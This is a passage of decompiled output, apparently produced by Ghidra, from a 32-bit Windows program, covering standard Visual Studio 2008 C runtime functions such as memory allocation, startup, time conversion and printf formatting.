    } while (iVar2 != 0);
    piVar4 = __errno();
    if (local_24 != (uint *)0x0) goto LAB_00406df2;
  }
  else {
    do {
      if ((uint *)0xffffffe0 < _NewSize) goto LAB_00406de6;
      if ((uint *)_NewSize == (uint *)0x0) {
        _NewSize = 1;
      }
      pvVar6 = HeapReAlloc(DAT_00419558,0,_Memory,_NewSize);
      if (pvVar6 != (LPVOID)0x0) {
        return pvVar6;
      }
      if (DAT_00419a00 == 0) {
        piVar4 = __errno();
LAB_00406e13:
        DVar5 = GetLastError();
        iVar2 = __get_errno_from_oserr(DVar5);
        *piVar4 = iVar2;
        return (void *)0x0;
      }
      iVar2 = __callnewh(_NewSize);
    } while (iVar2 != 0);
    piVar4 = __errno();
  }
  DVar5 = GetLastError();
  iVar2 = __get_errno_from_oserr(DVar5);
  *piVar4 = iVar2;
  return (void *)0x0;
LAB_00406de6:
  __callnewh(_NewSize);
  piVar4 = __errno();
LAB_00406df2:
  *piVar4 = 0xc;
  return (void *)0x0;
}



void FUN_00406d51(void)

{
  FUN_0040a124(4);
  return;
}



// WARNING: Removing unreachable block (ram,0x00406e5f)
// Library Function - Single Match
//  __time64
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

__time64_t __cdecl __time64(__time64_t *_Time)

{
  longlong lVar1;
  _FILETIME local_c;
  
  GetSystemTimeAsFileTime(&local_c);
  lVar1 = __aulldiv(local_c.dwLowDateTime + 0x2ac18000,
                    local_c.dwHighDateTime + 0xfe624e21 + (uint)(0xd53e7fff < local_c.dwLowDateTime)
                    ,10000000,0);
  if (0x793406fff < lVar1) {
    lVar1 = -1;
  }
  if (_Time != (__time64_t *)0x0) {
    *_Time = lVar1;
  }
  return lVar1;
}



// Library Function - Single Match
//  public: __thiscall std::bad_alloc::bad_alloc(void)
// 
// Library: Visual Studio 2008 Release

bad_alloc * __thiscall std::bad_alloc::bad_alloc(bad_alloc *this)

{
  exception::exception((exception *)this,&PTR_s_bad_allocation_00418170,1);
  *(undefined ***)this = vftable;
  return this;
}



undefined4 * __thiscall FUN_00406e9f(void *this,byte param_1)

{
  *(undefined ***)this = std::bad_alloc::vftable;
  exception::~exception((exception *)this);
  if ((param_1 & 1) != 0) {
    FUN_00406bc9(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_00406ec6(void *this,exception *param_1)

{
  std::exception::exception((exception *)this,param_1);
  *(undefined ***)this = std::bad_alloc::vftable;
  return (undefined4 *)this;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  void * __cdecl operator new(unsigned int)
// 
// Library: Visual Studio 2008 Release

void * __cdecl operator_new(uint param_1)

{
  code *pcVar1;
  int iVar2;
  void *pvVar3;
  undefined local_10 [12];
  
  do {
    pvVar3 = _malloc(param_1);
    if (pvVar3 != (void *)0x0) {
      return pvVar3;
    }
    iVar2 = __callnewh(param_1);
  } while (iVar2 != 0);
  if ((_DAT_0041948c & 1) == 0) {
    _DAT_0041948c = _DAT_0041948c | 1;
    std::bad_alloc::bad_alloc((bad_alloc *)&DAT_00419480);
    _atexit((_func_4879 *)&LAB_00413bf5);
  }
  FUN_00406ec6(local_10,(exception *)&DAT_00419480);
  __CxxThrowException_8(local_10,&DAT_00416994);
  pcVar1 = (code *)swi(3);
  pvVar3 = (void *)(*pcVar1)();
  return pvVar3;
}



// Library Function - Single Match
//  _fast_error_exit
// 
// Library: Visual Studio 2008 Release

void __cdecl _fast_error_exit(int param_1)

{
  if (DAT_00419498 == 1) {
    __FF_MSGBANNER();
  }
  __NMSG_WRITE(param_1);
  ___crtExitProcess(0xff);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x00406fd8)
// Library Function - Single Match
//  ___tmainCRTStartup
// 
// Library: Visual Studio 2008 Release

int ___tmainCRTStartup(void)

{
  int iVar1;
  uint *puVar2;
  _STARTUPINFOA local_6c;
  int local_24;
  int local_20;
  undefined4 uStack_c;
  undefined4 local_8;
  
  uStack_c = 0x406f7d;
  local_8 = 0;
  GetStartupInfoA(&local_6c);
  local_8 = 0xfffffffe;
  local_20 = 0;
  iVar1 = __heap_init();
  if (iVar1 == 0) {
    _fast_error_exit(0x1c);
  }
  iVar1 = __mtinit();
  if (iVar1 == 0) {
    _fast_error_exit(0x10);
  }
  __RTC_Initialize();
  local_8 = 1;
  iVar1 = __ioinit();
  if (iVar1 < 0) {
    __amsg_exit(0x1b);
  }
  DAT_0041b414 = GetCommandLineA();
  DAT_00419490 = ___crtGetEnvironmentStringsA();
  iVar1 = __setargv();
  if (iVar1 < 0) {
    __amsg_exit(8);
  }
  iVar1 = __setenvp();
  if (iVar1 < 0) {
    __amsg_exit(9);
  }
  iVar1 = __cinit(1);
  if (iVar1 != 0) {
    __amsg_exit(iVar1);
  }
  puVar2 = (uint *)__wincmdln();
  local_24 = FUN_00405ce0(0x400000,0,puVar2);
  if (local_20 == 0) {
                    // WARNING: Subroutine does not return
    _exit(local_24);
  }
  __cexit();
  return local_24;
}



void entry(void)

{
  ___security_init_cookie();
  ___tmainCRTStartup();
  return;
}



// Library Function - Single Match
//  __flsbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __flsbuf(int _Ch,FILE *_File)

{
  char *_Buf;
  char *pcVar1;
  FILE *_File_00;
  int *piVar2;
  undefined **ppuVar3;
  int iVar4;
  undefined *puVar5;
  int unaff_EDI;
  uint uVar6;
  longlong lVar7;
  uint local_8;
  
  _File_00 = _File;
  _File = (FILE *)__fileno(_File);
  uVar6 = _File_00->_flag;
  if ((uVar6 & 0x82) == 0) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0040711f:
    _File_00->_flag = _File_00->_flag | 0x20;
    return -1;
  }
  if ((uVar6 & 0x40) != 0) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    goto LAB_0040711f;
  }
  if ((uVar6 & 1) != 0) {
    _File_00->_cnt = 0;
    if ((uVar6 & 0x10) == 0) {
      _File_00->_flag = uVar6 | 0x20;
      return -1;
    }
    _File_00->_ptr = _File_00->_base;
    _File_00->_flag = uVar6 & 0xfffffffe;
  }
  uVar6 = _File_00->_flag;
  _File_00->_flag = uVar6 & 0xffffffef | 2;
  _File_00->_cnt = 0;
  local_8 = 0;
  if (((uVar6 & 0x10c) == 0) &&
     (((ppuVar3 = FUN_0040e1ce(), _File_00 != (FILE *)(ppuVar3 + 8) &&
       (ppuVar3 = FUN_0040e1ce(), _File_00 != (FILE *)(ppuVar3 + 0x10))) ||
      (iVar4 = __isatty((int)_File), iVar4 == 0)))) {
    __getbuf(_File_00);
  }
  if ((_File_00->_flag & 0x108U) == 0) {
    uVar6 = 1;
    local_8 = __write((int)_File,&_Ch,1);
  }
  else {
    _Buf = _File_00->_base;
    pcVar1 = _File_00->_ptr;
    _File_00->_ptr = _Buf + 1;
    uVar6 = (int)pcVar1 - (int)_Buf;
    _File_00->_cnt = _File_00->_bufsiz + -1;
    if ((int)uVar6 < 1) {
      if ((_File == (FILE *)0xffffffff) || (_File == (FILE *)0xfffffffe)) {
        puVar5 = &DAT_00418b10;
      }
      else {
        puVar5 = (undefined *)(((uint)_File & 0x1f) * 0x40 + (&DAT_0041b2e0)[(int)_File >> 5]);
      }
      if (((puVar5[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64((int)_File,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_00407247;
    }
    else {
      local_8 = __write((int)_File,_Buf,uVar6);
    }
    *_File_00->_base = (char)_Ch;
  }
  if (local_8 == uVar6) {
    return _Ch & 0xff;
  }
LAB_00407247:
  _File_00->_flag = _File_00->_flag | 0x20;
  return -1;
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2008 Release

void __fastcall _write_char(FILE *param_1)

{
  int *piVar1;
  byte in_AL;
  uint uVar2;
  int *unaff_ESI;
  
  if (((*(byte *)&param_1->_flag & 0x40) == 0) || (param_1->_base != (char *)0x0)) {
    piVar1 = &param_1->_cnt;
    *piVar1 = *piVar1 + -1;
    if (*piVar1 < 0) {
      uVar2 = __flsbuf((int)(char)in_AL,param_1);
    }
    else {
      *param_1->_ptr = in_AL;
      param_1->_ptr = param_1->_ptr + 1;
      uVar2 = (uint)in_AL;
    }
    if (uVar2 == 0xffffffff) {
      *unaff_ESI = -1;
      return;
    }
  }
  *unaff_ESI = *unaff_ESI + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_multi_char(undefined4 param_1,int param_2,FILE *param_3)

{
  int *in_EAX;
  
  do {
    if (param_2 < 1) {
      return;
    }
    param_2 = param_2 + -1;
    _write_char(param_3);
  } while (*in_EAX != -1);
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2008 Release

void __cdecl _write_string(int param_1)

{
  int *in_EAX;
  int *piVar1;
  FILE *unaff_EDI;
  
  if (((*(byte *)&unaff_EDI->_flag & 0x40) == 0) || (unaff_EDI->_base != (char *)0x0)) {
    while (0 < param_1) {
      param_1 = param_1 + -1;
      _write_char(unaff_EDI);
      if (*in_EAX == -1) {
        piVar1 = __errno();
        if (*piVar1 != 0x2a) {
          return;
        }
        _write_char(unaff_EDI);
      }
    }
  }
  else {
    *in_EAX = *in_EAX + param_1;
  }
  return;
}



// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __output_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __output_l(FILE *_File,char *_Format,_locale_t _Locale,va_list _ArgList)

{
  byte bVar1;
  wchar_t _WCh;
  FILE *pFVar2;
  int *piVar3;
  uint uVar4;
  code *pcVar5;
  int *piVar6;
  errno_t eVar7;
  int iVar8;
  undefined *puVar9;
  int extraout_ECX;
  byte *pbVar10;
  char *pcVar11;
  bool bVar12;
  undefined8 uVar13;
  int **ppiVar14;
  int *piVar15;
  int *piVar16;
  undefined4 uVar17;
  localeinfo_struct *plVar18;
  int *local_27c;
  int *local_278;
  undefined4 local_274;
  int local_270;
  int local_26c [2];
  int *local_264;
  localeinfo_struct local_260;
  int local_258;
  char local_254;
  FILE *local_250;
  int local_24c;
  int *local_248;
  int local_244;
  byte *local_240;
  int local_23c;
  int *local_238;
  int local_234;
  undefined local_230;
  char local_22f;
  int local_22c;
  int **local_228;
  int *local_224;
  int *local_220;
  int *local_21c;
  byte local_215;
  uint local_214;
  int local_210 [127];
  undefined local_11 [9];
  uint local_8;
  
  local_8 = DAT_00418df8 ^ (uint)&stack0xfffffffc;
  local_250 = _File;
  local_228 = (int **)_ArgList;
  local_24c = 0;
  local_214 = 0;
  local_238 = (int *)0x0;
  local_21c = (int *)0x0;
  local_234 = 0;
  local_244 = 0;
  local_23c = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_260,_Locale);
  if (_File != (FILE *)0x0) {
    if ((*(byte *)&_File->_flag & 0x40) == 0) {
      uVar4 = __fileno(_File);
      if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
        puVar9 = &DAT_00418b10;
      }
      else {
        puVar9 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0041b2e0)[(int)uVar4 >> 5]);
      }
      if ((puVar9[0x24] & 0x7f) == 0) {
        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
          puVar9 = &DAT_00418b10;
        }
        else {
          puVar9 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0041b2e0)[(int)uVar4 >> 5]);
        }
        if ((puVar9[0x24] & 0x80) == 0) goto LAB_00407407;
      }
    }
    else {
LAB_00407407:
      if (_Format != (char *)0x0) {
        local_215 = *_Format;
        local_22c = 0;
        local_224 = (int *)0x0;
        local_248 = (int *)0x0;
        iVar8 = 0;
        while ((local_215 != 0 &&
               (pbVar10 = (byte *)_Format + 1, local_240 = pbVar10, -1 < local_22c))) {
          if ((byte)(local_215 - 0x20) < 0x59) {
            uVar4 = (int)*(char *)((int)&PTR_FUN_004141d0 + (int)(char)local_215) & 0xf;
          }
          else {
            uVar4 = 0;
          }
          local_270 = (int)(char)(&DAT_004141f0)[uVar4 * 8 + iVar8] >> 4;
          switch(local_270) {
          case 0:
switchD_00407480_caseD_0:
            local_23c = 0;
            iVar8 = __isleadbyte_l((uint)local_215,&local_260);
            if (iVar8 != 0) {
              _write_char(local_250);
              local_240 = (byte *)_Format + 2;
              if (*pbVar10 == 0) goto LAB_0040736e;
            }
            _write_char(local_250);
            break;
          case 1:
            local_21c = (int *)0xffffffff;
            local_274 = 0;
            local_244 = 0;
            local_238 = (int *)0x0;
            local_234 = 0;
            local_214 = 0;
            local_23c = 0;
            break;
          case 2:
            if (local_215 == 0x20) {
              local_214 = local_214 | 2;
            }
            else if (local_215 == 0x23) {
              local_214 = local_214 | 0x80;
            }
            else if (local_215 == 0x2b) {
              local_214 = local_214 | 1;
            }
            else if (local_215 == 0x2d) {
              local_214 = local_214 | 4;
            }
            else if (local_215 == 0x30) {
              local_214 = local_214 | 8;
            }
            break;
          case 3:
            if (local_215 == 0x2a) {
              local_228 = (int **)((int)_ArgList + 4);
              local_238 = *(int **)_ArgList;
              if ((int)local_238 < 0) {
                local_214 = local_214 | 4;
                local_238 = (int *)-(int)local_238;
              }
            }
            else {
              local_238 = (int *)((int)local_238 * 10 + -0x30 + (int)(char)local_215);
            }
            break;
          case 4:
            local_21c = (int *)0x0;
            break;
          case 5:
            if (local_215 == 0x2a) {
              local_228 = (int **)((int)_ArgList + 4);
              local_21c = *(int **)_ArgList;
              if ((int)local_21c < 0) {
                local_21c = (int *)0xffffffff;
              }
            }
            else {
              local_21c = (int *)((int)local_21c * 10 + -0x30 + (int)(char)local_215);
            }
            break;
          case 6:
            if (local_215 == 0x49) {
              bVar1 = *pbVar10;
              if ((bVar1 == 0x36) && (((byte *)_Format)[2] == 0x34)) {
                local_214 = local_214 | 0x8000;
                local_240 = (byte *)_Format + 3;
              }
              else if ((bVar1 == 0x33) && (((byte *)_Format)[2] == 0x32)) {
                local_214 = local_214 & 0xffff7fff;
                local_240 = (byte *)_Format + 3;
              }
              else if (((((bVar1 != 100) && (bVar1 != 0x69)) && (bVar1 != 0x6f)) &&
                       ((bVar1 != 0x75 && (bVar1 != 0x78)))) && (bVar1 != 0x58)) {
                local_270 = 0;
                goto switchD_00407480_caseD_0;
              }
            }
            else if (local_215 == 0x68) {
              local_214 = local_214 | 0x20;
            }
            else if (local_215 == 0x6c) {
              if (*pbVar10 == 0x6c) {
                local_214 = local_214 | 0x1000;
                local_240 = (byte *)_Format + 2;
              }
              else {
                local_214 = local_214 | 0x10;
              }
            }
            else if (local_215 == 0x77) {
              local_214 = local_214 | 0x800;
            }
            break;
          case 7:
            if ((char)local_215 < 'e') {
              if (local_215 == 100) {
LAB_0040796b:
                local_214 = local_214 | 0x40;
LAB_00407972:
                local_224 = (int *)0xa;
LAB_0040797c:
                if (((local_214 & 0x8000) == 0) && ((local_214 & 0x1000) == 0)) {
                  local_228 = (int **)((int)_ArgList + 4);
                  if ((local_214 & 0x20) == 0) {
                    piVar3 = *(int **)_ArgList;
                    if ((local_214 & 0x40) == 0) {
                      piVar6 = (int *)0x0;
                    }
                    else {
                      piVar6 = (int *)((int)piVar3 >> 0x1f);
                    }
                  }
                  else {
                    if ((local_214 & 0x40) == 0) {
                      piVar3 = (int *)(uint)*(ushort *)_ArgList;
                    }
                    else {
                      piVar3 = (int *)(int)*(short *)_ArgList;
                    }
                    piVar6 = (int *)((int)piVar3 >> 0x1f);
                  }
                }
                else {
                  piVar3 = *(int **)_ArgList;
                  piVar6 = *(int **)((int)_ArgList + 4);
                  local_228 = (int **)((int)_ArgList + 8);
                }
                if ((((local_214 & 0x40) != 0) && ((int)piVar6 < 1)) && ((int)piVar6 < 0)) {
                  bVar12 = piVar3 != (int *)0x0;
                  piVar3 = (int *)-(int)piVar3;
                  piVar6 = (int *)-(int)((int)piVar6 + (uint)bVar12);
                  local_214 = local_214 | 0x100;
                }
                uVar13 = CONCAT44(piVar6,piVar3);
                if ((local_214 & 0x9000) == 0) {
                  piVar6 = (int *)0x0;
                }
                if ((int)local_21c < 0) {
                  local_21c = (int *)0x1;
                }
                else {
                  local_214 = local_214 & 0xfffffff7;
                  if (0x200 < (int)local_21c) {
                    local_21c = (int *)0x200;
                  }
                }
                if (((uint)piVar3 | (uint)piVar6) == 0) {
                  local_234 = 0;
                }
                piVar3 = (int *)local_11;
                while( true ) {
                  piVar15 = piVar6;
                  piVar6 = (int *)((int)local_21c + -1);
                  if (((int)local_21c < 1) && (((uint)uVar13 | (uint)piVar15) == 0)) break;
                  local_21c = piVar6;
                  uVar13 = __aulldvrm((uint)uVar13,(uint)piVar15,(uint)local_224,
                                      (int)local_224 >> 0x1f);
                  iVar8 = extraout_ECX + 0x30;
                  if (0x39 < iVar8) {
                    iVar8 = iVar8 + local_24c;
                  }
                  *(char *)piVar3 = (char)iVar8;
                  piVar3 = (int *)((int)piVar3 + -1);
                  piVar6 = (int *)((ulonglong)uVar13 >> 0x20);
                  local_264 = piVar15;
                }
                local_224 = (int *)(local_11 + -(int)piVar3);
                local_220 = (int *)((int)piVar3 + 1);
                local_21c = piVar6;
                if (((local_214 & 0x200) != 0) &&
                   ((local_224 == (int *)0x0 || (*(char *)local_220 != '0')))) {
                  *(char *)piVar3 = '0';
                  local_224 = (int *)(local_11 + -(int)piVar3 + 1);
                  local_220 = piVar3;
                }
              }
              else if ((char)local_215 < 'T') {
                if (local_215 == 0x53) {
                  if ((local_214 & 0x830) == 0) {
                    local_214 = local_214 | 0x800;
                  }
                  goto LAB_00407797;
                }
                if (local_215 == 0x41) {
LAB_00407716:
                  local_215 = local_215 + 0x20;
                  local_274 = 1;
LAB_00407729:
                  local_214 = local_214 | 0x40;
                  local_264 = (int *)0x200;
                  piVar6 = local_210;
                  piVar3 = local_264;
                  piVar15 = local_210;
                  if ((int)local_21c < 0) {
                    local_21c = (int *)0x6;
                  }
                  else if (local_21c == (int *)0x0) {
                    if (local_215 == 0x67) {
                      local_21c = (int *)0x1;
                    }
                  }
                  else {
                    if (0x200 < (int)local_21c) {
                      local_21c = (int *)0x200;
                    }
                    if (0xa3 < (int)local_21c) {
                      piVar3 = (int *)((int)local_21c + 0x15d);
                      local_220 = local_210;
                      local_248 = (int *)__malloc_crt((size_t)piVar3);
                      piVar6 = local_248;
                      piVar15 = local_248;
                      if (local_248 == (int *)0x0) {
                        local_21c = (int *)0xa3;
                        piVar6 = local_210;
                        piVar3 = local_264;
                        piVar15 = local_220;
                      }
                    }
                  }
                  local_220 = piVar15;
                  local_264 = piVar3;
                  local_27c = *(int **)_ArgList;
                  local_228 = (int **)((int)_ArgList + 8);
                  local_278 = *(int **)((int)_ArgList + 4);
                  plVar18 = &local_260;
                  iVar8 = (int)(char)local_215;
                  ppiVar14 = &local_27c;
                  piVar3 = piVar6;
                  piVar15 = local_264;
                  piVar16 = local_21c;
                  uVar17 = local_274;
                  pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00418de8);
                  (*pcVar5)(ppiVar14,piVar3,piVar15,iVar8,piVar16,uVar17,plVar18);
                  uVar4 = local_214 & 0x80;
                  if ((uVar4 != 0) && (local_21c == (int *)0x0)) {
                    plVar18 = &local_260;
                    piVar3 = piVar6;
                    pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00418df4);
                    (*pcVar5)(piVar3,plVar18);
                  }
                  if ((local_215 == 0x67) && (uVar4 == 0)) {
                    plVar18 = &local_260;
                    piVar3 = piVar6;
                    pcVar5 = (code *)__decode_pointer((int)PTR_LAB_00418df0);
                    (*pcVar5)(piVar3,plVar18);
                  }
                  if (*(char *)piVar6 == '-') {
                    local_214 = local_214 | 0x100;
                    local_220 = (int *)((int)piVar6 + 1);
                    piVar6 = local_220;
                  }
LAB_004078c9:
                  local_224 = (int *)_strlen((char *)piVar6);
                }
                else if (local_215 == 0x43) {
                  if ((local_214 & 0x830) == 0) {
                    local_214 = local_214 | 0x800;
                  }
LAB_0040780a:
                  local_228 = (int **)((int)_ArgList + 4);
                  if ((local_214 & 0x810) == 0) {
                    local_210[0]._0_1_ = *_ArgList;
                    local_224 = (int *)0x1;
                  }
                  else {
                    eVar7 = _wctomb_s((int *)&local_224,(char *)local_210,0x200,*(wchar_t *)_ArgList
                                     );
                    if (eVar7 != 0) {
                      local_244 = 1;
                    }
                  }
                  local_220 = local_210;
                }
                else if ((local_215 == 0x45) || (local_215 == 0x47)) goto LAB_00407716;
              }
              else {
                if (local_215 == 0x58) goto LAB_00407ad0;
                if (local_215 == 0x5a) {
                  piVar3 = *(int **)_ArgList;
                  local_228 = (int **)((int)_ArgList + 4);
                  piVar6 = (int *)PTR_s__null__004181b0;
                  local_220 = (int *)PTR_s__null__004181b0;
                  if ((piVar3 == (int *)0x0) || (piVar15 = (int *)piVar3[1], piVar15 == (int *)0x0))
                  goto LAB_004078c9;
                  local_224 = (int *)(int)*(wchar_t *)piVar3;
                  local_220 = piVar15;
                  if ((local_214 & 0x800) == 0) {
                    local_23c = 0;
                  }
                  else {
                    local_224 = (int *)((int)local_224 / 2);
                    local_23c = 1;
                  }
                }
                else {
                  if (local_215 == 0x61) goto LAB_00407729;
                  if (local_215 == 99) goto LAB_0040780a;
                }
              }
LAB_00407ca8:
              if (local_244 == 0) {
                if ((local_214 & 0x40) != 0) {
                  if ((local_214 & 0x100) == 0) {
                    if ((local_214 & 1) == 0) {
                      if ((local_214 & 2) == 0) goto LAB_00407cf1;
                      local_230 = 0x20;
                    }
                    else {
                      local_230 = 0x2b;
                    }
                  }
                  else {
                    local_230 = 0x2d;
                  }
                  local_234 = 1;
                }
LAB_00407cf1:
                pcVar11 = (char *)((int)local_238 + (-local_234 - (int)local_224));
                if ((local_214 & 0xc) == 0) {
                  _write_multi_char(0x20,(int)pcVar11,local_250);
                }
                pFVar2 = local_250;
                _write_string(local_234);
                if (((local_214 & 8) != 0) && ((local_214 & 4) == 0)) {
                  _write_multi_char(0x30,(int)pcVar11,pFVar2);
                }
                if ((local_23c == 0) || ((int)local_224 < 1)) {
                  _write_string((int)local_224);
                }
                else {
                  local_264 = local_224;
                  piVar3 = local_220;
                  do {
                    _WCh = *(wchar_t *)piVar3;
                    local_264 = (int *)((int)local_264 + -1);
                    piVar3 = (int *)((int)piVar3 + 2);
                    eVar7 = _wctomb_s(local_26c,local_11 + 1,6,_WCh);
                    if ((eVar7 != 0) || (local_26c[0] == 0)) {
                      local_22c = -1;
                      break;
                    }
                    _write_string(local_26c[0]);
                  } while (local_264 != (int *)0x0);
                }
                if ((-1 < local_22c) && ((local_214 & 4) != 0)) {
                  _write_multi_char(0x20,(int)pcVar11,pFVar2);
                }
              }
            }
            else {
              if ('p' < (char)local_215) {
                if (local_215 == 0x73) {
LAB_00407797:
                  piVar3 = local_21c;
                  if (local_21c == (int *)0xffffffff) {
                    piVar3 = (int *)0x7fffffff;
                  }
                  local_228 = (int **)((int)_ArgList + 4);
                  local_220 = *(int **)_ArgList;
                  if ((local_214 & 0x810) == 0) {
                    local_224 = local_220;
                    if (local_220 == (int *)0x0) {
                      local_224 = (int *)PTR_s__null__004181b0;
                      local_220 = (int *)PTR_s__null__004181b0;
                    }
                    for (; (piVar3 != (int *)0x0 &&
                           (piVar3 = (int *)((int)piVar3 + -1), *(char *)local_224 != '\0'));
                        local_224 = (int *)((int)local_224 + 1)) {
                    }
                    local_224 = (int *)((int)local_224 - (int)local_220);
                  }
                  else {
                    if (local_220 == (int *)0x0) {
                      local_220 = (int *)PTR_u__null__004181b4;
                    }
                    local_23c = 1;
                    for (piVar6 = local_220;
                        (piVar3 != (int *)0x0 &&
                        (piVar3 = (int *)((int)piVar3 + -1), *(wchar_t *)piVar6 != L'\0'));
                        piVar6 = (int *)((int)piVar6 + 2)) {
                    }
                    local_224 = (int *)((int)piVar6 - (int)local_220 >> 1);
                  }
                  goto LAB_00407ca8;
                }
                if (local_215 == 0x75) goto LAB_00407972;
                if (local_215 != 0x78) goto LAB_00407ca8;
                local_24c = 0x27;
LAB_00407afc:
                local_224 = (int *)0x10;
                if ((local_214 & 0x80) != 0) {
                  local_22f = (char)local_24c + 'Q';
                  local_230 = 0x30;
                  local_234 = 2;
                }
                goto LAB_0040797c;
              }
              if (local_215 == 0x70) {
                local_21c = (int *)0x8;
LAB_00407ad0:
                local_24c = 7;
                goto LAB_00407afc;
              }
              if ((char)local_215 < 'e') goto LAB_00407ca8;
              if ((char)local_215 < 'h') goto LAB_00407729;
              if (local_215 == 0x69) goto LAB_0040796b;
              if (local_215 != 0x6e) {
                if (local_215 != 0x6f) goto LAB_00407ca8;
                local_224 = (int *)0x8;
                if ((local_214 & 0x80) != 0) {
                  local_214 = local_214 | 0x200;
                }
                goto LAB_0040797c;
              }
              piVar3 = *(int **)_ArgList;
              local_228 = (int **)((int)_ArgList + 4);
              iVar8 = __get_printf_count_output();
              if (iVar8 == 0) goto LAB_0040736e;
              if ((local_214 & 0x20) == 0) {
                *piVar3 = local_22c;
              }
              else {
                *(wchar_t *)piVar3 = (wchar_t)local_22c;
              }
              local_244 = 1;
            }
            if (local_248 != (int *)0x0) {
              _free(local_248);
              local_248 = (int *)0x0;
            }
          }
          local_215 = *local_240;
          iVar8 = local_270;
          _Format = (char *)local_240;
          _ArgList = (va_list)local_228;
        }
        if (local_254 != '\0') {
          *(uint *)(local_258 + 0x70) = *(uint *)(local_258 + 0x70) & 0xfffffffd;
        }
        goto LAB_00407e6b;
      }
    }
  }
LAB_0040736e:
  piVar3 = __errno();
  *piVar3 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_254 != '\0') {
    *(uint *)(local_258 + 0x70) = *(uint *)(local_258 + 0x70) & 0xfffffffd;
  }
LAB_00407e6b:
  iVar8 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar8;
}



void __cdecl FUN_00407e9b(undefined4 param_1)

{
  DAT_0041949c = param_1;
  return;
}



// Library Function - Single Match
//  __invoke_watson
// 
// Library: Visual Studio 2008 Release

void __cdecl
__invoke_watson(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,uintptr_t param_5)

{
  uint uVar1;
  BOOL BVar2;
  LONG LVar3;
  HANDLE hProcess;
  UINT uExitCode;
  EXCEPTION_RECORD local_32c;
  _EXCEPTION_POINTERS local_2dc;
  undefined4 local_2d4;
  
  uVar1 = DAT_00418df8 ^ (uint)&stack0xfffffffc;
  local_32c.ExceptionCode = 0;
  _memset(&local_32c.ExceptionFlags,0,0x4c);
  local_2dc.ExceptionRecord = &local_32c;
  local_2dc.ContextRecord = (PCONTEXT)&local_2d4;
  local_2d4 = 0x10001;
  local_32c.ExceptionCode = 0xc0000417;
  local_32c.ExceptionFlags = 1;
  BVar2 = IsDebuggerPresent();
  SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)0x0);
  LVar3 = UnhandledExceptionFilter(&local_2dc);
  if ((LVar3 == 0) && (BVar2 == 0)) {
    FUN_0040e795();
  }
  uExitCode = 0xc0000417;
  hProcess = GetCurrentProcess();
  TerminateProcess(hProcess,uExitCode);
  ___security_check_cookie_4(uVar1 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  __invalid_parameter
// 
// Library: Visual Studio 2008 Release

void __cdecl
__invalid_parameter(wchar_t *param_1,wchar_t *param_2,wchar_t *param_3,uint param_4,
                   uintptr_t param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  
  UNRECOVERED_JUMPTABLE = (code *)__decode_pointer(DAT_0041949c);
  if (UNRECOVERED_JUMPTABLE != (code *)0x0) {
                    // WARNING: Could not recover jumptable at 0x00407fe8. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)();
    return;
  }
  FUN_0040e795();
                    // WARNING: Subroutine does not return
  __invoke_watson(param_1,param_2,param_3,param_4,param_5);
}



// Library Function - Single Match
//  __gmtime64_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl __gmtime64_s(tm *_Tm,__time64_t *_Time)

{
  tm *ptVar1;
  bool bVar2;
  tm *ptVar3;
  int *piVar4;
  uint uVar5;
  int iVar6;
  undefined4 *puVar7;
  int iVar8;
  uint uVar9;
  bool bVar10;
  undefined8 uVar11;
  longlong lVar12;
  longlong lVar13;
  uint local_10;
  
  ptVar3 = _Tm;
  bVar2 = false;
  if ((_Tm == (tm *)0x0) || (_memset(_Tm,0xff,0x24), _Time == (__time64_t *)0x0)) {
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return 0x16;
  }
  uVar9 = *(uint *)_Time;
  uVar5 = *(uint *)((int)_Time + 4);
  lVar13 = *_Time;
  if (((0x7fffffff < uVar5) && (((int)uVar5 < -1 || (uVar9 < 0xffff5740)))) ||
     ((6 < (int)uVar5 && ((7 < (int)uVar5 || (0x934126cf < uVar9)))))) {
    piVar4 = __errno();
    *piVar4 = 0x16;
    return 0x16;
  }
  uVar11 = __alldiv(uVar9,uVar5,0x1e13380,0);
  uVar9 = (uint)uVar11;
  _Tm = (tm *)(uVar9 + 0x46);
  ptVar1 = (tm *)(uVar9 + 0x45);
  lVar12 = __allmul(uVar9,(int)uVar9 >> 0x1f,0xfffffe93,0xffffffff);
  lVar12 = lVar12 - (((int)(uVar9 + 0x171) / 400 - (int)ptVar1 / 100) + -0x11 +
                    ((int)((int)&ptVar1->tm_sec + ((int)ptVar1 >> 0x1f & 3U)) >> 2));
